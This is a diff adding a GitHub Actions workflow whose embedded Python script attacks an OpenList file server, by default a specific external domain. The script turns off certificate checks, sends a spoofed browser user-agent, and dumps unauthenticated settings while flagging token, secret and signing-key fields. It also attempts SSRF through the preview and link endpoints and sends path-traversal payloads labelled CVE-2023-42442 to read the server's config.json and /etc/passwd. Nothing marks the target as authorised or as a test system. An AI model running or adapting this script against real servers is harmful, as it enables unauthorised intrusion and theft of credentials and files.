@@ -1,0 +1,97 @@
+name: openlist-poc3-final
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'OpenList base URL'
+        required: false
+        default: 'https://pan.yazinb.icu'
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      BASE: ${{ github.event.inputs.target }}
+    steps:
+      - name: Confirmatory unauth surface + preview/link SSRF + public settings dump
+        run: |
+          python3 - <<'PYEOF'
+          import urllib.request, urllib.parse, ssl, json, os
+          ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          base=os.environ['BASE'].rstrip('/')
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          def fetch(method, path, token=None, body=None, raw=False):
+              h={'User-Agent':UA,'Accept':'application/json, text/plain, */*'}
+              if token: h['Authorization']=token
+              data=None
+              if body is not None: data=json.dumps(body).encode(); h['Content-Type']='application/json'
+              req=urllib.request.Request(base+path, data=data, headers=h, method=method)
+              try:
+                  r=urllib.request.urlopen(req, timeout=30, context=ctx)
+                  b=r.read()
+                  return r.status, b if raw else b.decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() if raw else e.read().decode('utf-8','replace'))
+
+          # 1) full /api/public/settings dump (UNAUTH) - check for any secret/token/signing key
+          print("===== 1) /api/public/settings FULL (UNAUTH) =====")
+          s,b=fetch('GET','/api/public/settings')
+          print("HTTP %s len=%d" % (s, len(b)))
+          print(b)
+          try:
+              j=json.loads(b)
+              ks=list(j.get('data',{}).keys()) if isinstance(j.get('data'),dict) else []
+              print("=== data keys (%d): %s" % (len(ks), ks))
+              # flag anything suspicious
+              sus=[k for k in ks if any(w in k.lower() for w in ['token','key','secret','pass','sign','jwt','admin','pwd'])]
+              print("=== SUSPICIOUS keys:", sus)
+          except Exception as e:
+              print("parse err", e)
+
+          # 2) /api/me unauth
+          print("===== 2) /api/me (UNAUTH) =====")
+          s,b=fetch('GET','/api/me')
+          print("HTTP %s len=%d  %s" % (s, len(b), b[:200].replace('\n',' ')))
+
+          # 3) preview/link SSRF endpoints (these proxy external content server-side in some versions)
+          print("===== 3) preview/link proxy SSRF attempts (UNAUTH) =====")
+          for ep, kw in [
+            ("/api/fs/preview?path=/Artex%20直装包%20渗透网站专用","GET preview"),
+            ("/api/fs/link?path=/Artex%20直装包%20渗透网站专用","GET link"),
+            ("/api/fs/preview","POST preview"),
+            ("/api/fs/link","POST link"),
+          ]:
+              if kw[0].startswith("GET"):
+                  s,b=fetch('GET', ep)
+              else:
+                  s,b=fetch('POST', ep, body={"path":"/Artex 直装包 渗透网站专用"})
+              print("[%s] HTTP %s len=%d  %s" % (kw[1], s, len(b), b[:200].replace('\n',' ')))
+
+          # 4) raw_url signed-link SSRF: grab a real file's raw_url then try to see if it proxies
+          print("===== 4) raw_url from /api/fs/get of a real listed file =====")
+          s,b=fetch('POST','/api/fs/get', body={"path":"/Artex 直装包 渗透网站专用"})
+          try:
+              j=json.loads(b)
+              ru=j.get('data',{}).get('raw_url','')
+              print("raw_url=", ru)
+              if ru:
+                  # fetch the raw_url (relative, same host) - just confirm it's same-host, not arbitrary
+                  if ru.startswith('/') or ru.startswith(base):
+                      print("raw_url is same-host signed link -> not SSRF")
+                  else:
+                      print("raw_url EXTERNAL -> potential SSRF, fetch:", ru[:200])
+          except Exception as e:
+              print("err", e, b[:120])
+
+          # 5) CVE-2023-42442 exact canonical payload shape once more (path with '../' + trailing file)
+          print("===== 5) canonical CVE-2023-42442 payload =====")
+          for p in ["../data/config.json","../../../../../../etc/passwd","../../data/config.json"]:
+              s,b=fetch('GET','/api/fs/get?path='+urllib.parse.quote(p,safe=''))
+              print("GET %s -> HTTP %s len=%d  %s" % (p, s, len(b), b[:120].replace('\n',' ')))
+
+          print("DONE")
+          PYEOF
